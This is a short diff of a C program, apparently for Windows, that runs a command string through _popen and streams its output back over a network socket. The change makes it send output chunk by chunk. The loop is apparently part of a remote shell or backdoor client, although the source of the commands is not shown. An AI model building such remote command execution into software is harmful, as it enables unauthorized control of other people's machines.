@@ -72,21 +72,19 @@ int main() {
         FILE *fp = _popen(cmd, "r");
 
         char output[4096];
-
-        size_t len = 0;
         int n_bytes;
-        while ((n_bytes = fread(output + len, 1, sizeof(output) - 1 - len, fp)) > 0) {
-          len += n_bytes;
+        while ((n_bytes = fread(output, 1, sizeof(output), fp)) > 0) {
+
+          size_t sent = 0;
+          while (sent < n_bytes) {
+            int n = send(sock, output + sent, n_bytes - sent, 0);
+
+            sent += n;
+          }
+
         }
 
         _pclose(fp);
-
-        size_t sent = 0;
-        while (sent < len) {
-          int n = send(sock, output + sent , len - sent, 0);
-
-          sent += n;
-        }
       }
 
     } else {
